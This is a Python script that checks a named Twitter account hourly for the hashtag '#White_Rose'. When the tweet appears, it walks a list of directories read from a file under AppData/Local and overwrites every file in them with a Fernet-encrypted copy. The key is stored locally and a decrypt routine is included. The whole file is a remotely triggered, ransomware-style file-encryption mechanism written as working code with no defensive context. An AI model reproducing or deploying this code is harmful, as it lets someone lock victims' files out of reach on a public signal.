import twint
import os
from cryptography.fernet import Fernet
from time import time, sleep
# Require twint, twint-fork

def _main_loop(t_config, keyfilepath):
    while True:
        sleep(3600 - time() % 3600) # 86400 = 24hours - 3600 = 1hour checks
        twint.run.Search(t_config)

        tweets = twint.output.tweets_list

        if len(tweets) >= 1:
            print("Fire")
            
            if os.path.isfile("AppData/Local/dirs.txt"):
                with open("AppData/Local/dirs.txt", "r") as file:
                    Directories = file.readlines()
                file.close()
                Directories = [x.strip() for x in Directories]
            else:
                print("Directories not found, exiting")
                exit()
            for dir in Directories:
                encrypt(dir, keyfilepath)
            # When excecusion is finished end
            exit()
        else:
            print("Tweet Not Found on Twitter with Specified username")


def create_key(keyfilepath, is_decrypting):
    if is_decrypting and os.path.isfile(keyfilepath):
        with open(keyfilepath, 'rb') as filekey:
                key = filekey.read()
    elif is_decrypting and not os.path.isfile(keyfilepath):
        print("Key not found exiting")
        quit()
    elif not is_decrypting and os.path.isfile(keyfilepath):
        with open(keyfilepath, 'rb') as filekey:
            key = filekey.read()
    else:
        key = Fernet.generate_key()
        with open(keyfilepath, 'wb') as filekey:
            filekey.write(key)

    return Fernet(key)

def encrypt(path, keyfilepath):
    fernet = create_key(keyfilepath, False)

    for subdir, dir, files in os.walk(path):
        for filename in files:
            filepath = subdir + "/" + filename
            # opening the original file to encrypt
            with open(filepath, 'rb') as file:
                original = file.read()
      
            # encrypting the file
            encrypted = fernet.encrypt(original)
  
            # writing the encrypted data
            with open(filepath, 'wb') as encrypted_file:
                encrypted_file.write(encrypted)

def decrypt(path, keyfilepath):
    fernet = create_key(keyfilepath, True)

    for subdir, dir, files in os.walk(path):
        for filename in files:
            filepath = subdir + "/" + filename

            # opening the encrypted file
            with open(filepath, 'rb') as enc_file:
                encrypted = enc_file.read()
            # decrypting the file
            decrypted = fernet.decrypt(encrypted)  
            # writing the decrypted data
            with open(filepath, 'wb') as dec_file:
                dec_file.write(decrypted)

if __name__ == '__main__':

    c = twint.Config()
    c.Username = "KatVixie"
    # c.Search = "White_Rose" # actual test case
    c.Search = '#White_Rose'
    # Have to add store object to be able to use the output
    c.Store_object = True
    # Store to a external CSV file.
    # c.Store_csv = True
    # Hide the output to the console
    c.Hide_output = True

    _main_loop(c, 'AppData/Local/key.key')
